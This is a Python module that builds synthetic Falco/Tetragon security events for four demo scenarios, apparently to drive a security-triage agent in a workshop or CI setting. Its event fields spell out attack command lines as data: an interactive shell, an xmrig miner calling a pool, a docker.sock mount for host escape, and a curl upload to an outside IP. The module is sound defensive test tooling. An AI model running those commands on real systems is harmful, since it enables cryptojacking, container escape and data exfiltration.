"""Synthetic runtime-security event generator (Phase 21.2).

Four canned threat scenarios, one per security runbook. Each emits a
Falco/Tetragon-shaped JSON document (rule, priority, output, output_fields)
with `source: "falco"` so the graph's triage node classifies it as the
security domain. The agent can't tell these from real Falco/Tetragon events.

This is the **offline / CI / fallback-demo path**: eBPF telemetry
(Falco/Tetragon) is unreliable in kind-on-Docker-Desktop-Windows, so the
synthetic generator lets the workshop demo run anywhere. On real Linux
workshop hardware the same scenarios fire from live eBPF (see
falco_bridge.py + tetragon_observer.py).

Used two ways:
  - `python -m agent.security_events --scenario reverse-shell` → NATS.
  - `from agent.security_events import build_event` → the dict in-process
    (the use-case runner + tests).
"""

from __future__ import annotations

import argparse
import asyncio
import json
import logging
import sys
import uuid
from datetime import UTC, datetime
from typing import Any

import nats

from agent.config import kubectl_auth_args, settings
from agent.logging_utils import configure_logging

log = logging.getLogger("security_events")

# Subject pattern: security.events.<kind>. The 4 scenarios map 1:1 to the 4
# security runbooks. Each simulates the SHAPE of a runtime-security event a
# real Falco rule / Tetragon TracingPolicy would emit.
_SUBJECTS = {
    "reverse-shell": "security.events.terminal_shell",
    "crypto-miner": "security.events.suspicious_process",
    "priv-esc": "security.events.privilege_escalation",
    "data-exfil": "security.events.suspicious_egress",
}


def _now_iso() -> str:
    return datetime.now(UTC).isoformat().replace("+00:00", "Z")


def _event(
    scenario: str, rule: str, priority: str, output: str, fields: dict[str, Any], source: str
) -> dict[str, Any]:
    return {
        "uuid": str(uuid.uuid4()),
        "time": _now_iso(),
        "rule": rule,
        "priority": priority,
        # source ∈ {falco, tetragon} → triage classifies domain=security.
        "source": source,
        "output": output,
        "output_fields": fields,
        "scenario_id": scenario,
        # Explicit domain tag (belt-and-suspenders alongside `source`).
        "domain": "security",
    }


def _resolve_pod_name(namespace: str, app_label: str, fallback: str) -> str:
    """Look up a real running pod matching `app=<label>` so the agent's
    containment action targets an actual pod. Falls back to the conceptual
    name if the cluster lookup fails. (Same helper shape as
    synthetic_events._resolve_pod_name.)"""
    import subprocess

    try:
        p = subprocess.run(
            [
                "kubectl",
                *kubectl_auth_args(),
                "get",
                "pods",
                "-n",
                namespace,
                "-l",
                f"app={app_label}",
                "-o",
                "jsonpath={.items[0].metadata.name}",
            ],
            capture_output=True,
            text=True,
            timeout=10,
        )
        name = p.stdout.strip()
        if name:
            return name
    except Exception:  # noqa: BLE001
        pass
    return fallback


def build_event(scenario: str) -> dict[str, Any]:
    """Construct a runtime-security event for the given scenario.

    Scenarios: reverse-shell · crypto-miner · priv-esc · data-exfil.
    Each is the shape a real Falco rule (or Tetragon TracingPolicy) would
    emit. The target pod is resolved to a real running pod (default
    `app=nginx-demo` in `workloads`) so the agent's isolate/contain action
    has a live target.
    """
    pod = _resolve_pod_name("workloads", "nginx-demo", "nginx-demo")

    if scenario == "reverse-shell":
        return _event(
            "reverse-shell",
            rule="Terminal shell in container",
            priority="Critical",
            output=(
                f"A shell was spawned in a container with an attached terminal. "
                f"proc=/bin/sh parent=nginx ns=workloads pod={pod}"
            ),
            fields={
                "event.type": "ProcessExec",
                "proc.name": "sh",
                "proc.cmdline": "/bin/sh -i",
                "proc.pname": "nginx",
                "proc.tty": "34816",
                "container.name": "nginx",
                "k8s.ns.name": "workloads",
                "k8s.pod.name": pod,
                "k8s.deployment.name": "nginx-demo",
                "evt.time": _now_iso(),
            },
            source="falco",
        )
    if scenario == "crypto-miner":
        return _event(
            "crypto-miner",
            rule="Launch suspicious tool / crypto-miner detected",
            priority="Critical",
            output=(
                f"Process matching a known miner signature started in ns=workloads "
                f"pod={pod}: xmrig --url pool.minexmr.com:4444"
            ),
            fields={
                "event.type": "ProcessExec",
                "proc.name": "xmrig",
                "proc.cmdline": "xmrig --url pool.minexmr.com:4444 --user 4xWALLET...",
                "proc.pname": "sh",
                "container.name": "nginx",
                "k8s.ns.name": "workloads",
                "k8s.pod.name": pod,
                "k8s.deployment.name": "nginx-demo",
                "net.dst.host": "pool.minexmr.com",
                "net.dst.port": "4444",
                "evt.time": _now_iso(),
            },
            source="falco",
        )
    if scenario == "priv-esc":
        return _event(
            "priv-esc",
            rule="Sensitive mount launched (container escape primitive)",
            priority="Critical",
            output=(
                f"Container in ns=workloads pod={pod} mounted the container runtime "
                f"socket /var/run/docker.sock — direct host-escape primitive"
            ),
            fields={
                "event.type": "ProcessExec",
                "proc.name": "mount",
                "proc.cmdline": "mount /var/run/docker.sock",
                "container.name": "nginx",
                "container.mounts": "/var/run/docker.sock:/var/run/docker.sock",
                "container.privileged": "true",
                "k8s.ns.name": "workloads",
                "k8s.pod.name": pod,
                "k8s.deployment.name": "nginx-demo",
                "k8s.node.name": "k3d-poc-server-0",
                "evt.time": _now_iso(),
            },
            source="tetragon",
        )
    if scenario == "data-exfil":
        return _event(
            "data-exfil",
            rule="Unexpected outbound connection (possible data exfiltration)",
            priority="Error",
            output=(
                f"Pod ns=workloads pod={pod} opened an outbound connection to an "
                f"external IP 203.0.113.66:8443 (not in the egress allowlist)"
            ),
            fields={
                "event.type": "ProcessKprobe",
                "proc.name": "curl",
                "proc.cmdline": "curl -sk https://203.0.113.66:8443/upload",
                "container.name": "nginx",
                "k8s.ns.name": "workloads",
                "k8s.pod.name": pod,
                "k8s.deployment.name": "nginx-demo",
                "net.dst.ip": "203.0.113.66",
                "net.dst.port": "8443",
                "net.egress_bytes": "48211904",  # ~46 MiB leaving
                "evt.time": _now_iso(),
            },
            source="tetragon",
        )
    raise ValueError(f"unknown scenario {scenario!r}; use one of {sorted(_SUBJECTS)}")


async def _publish(scenario: str) -> None:
    event = build_event(scenario)
    subject = _SUBJECTS[scenario]
    nc = await nats.connect(settings.nats_url)
    js = nc.jetstream()
    try:
        # A dedicated SECURITY stream keeps security retention/replay
        # independent from the SRE INFRA stream.
        await js.add_stream(name="SECURITY", subjects=["security.events.>"])
    except Exception as exc:  # noqa: BLE001
        log.debug("add_stream noted: %s", exc)
    ack = await js.publish(subject, json.dumps(event).encode("utf-8"))
    log.info("published scenario=%s subject=%s seq=%s", scenario, subject, ack.seq)
    await nc.drain()


def main() -> int:
    p = argparse.ArgumentParser(description="publish a synthetic runtime-security event")
    p.add_argument("--scenario", required=True, choices=list(_SUBJECTS))
    p.add_argument(
        "--print-only",
        action="store_true",
        help="print the event JSON to stdout; don't publish to NATS",
    )
    p.add_argument("--verbose", action="store_true")
    args = p.parse_args()
    configure_logging("DEBUG" if args.verbose else None)

    if args.print_only:
        print(json.dumps(build_event(args.scenario), indent=2))
        return 0
    asyncio.run(_publish(args.scenario))
    return 0


if __name__ == "__main__":
    sys.exit(main())
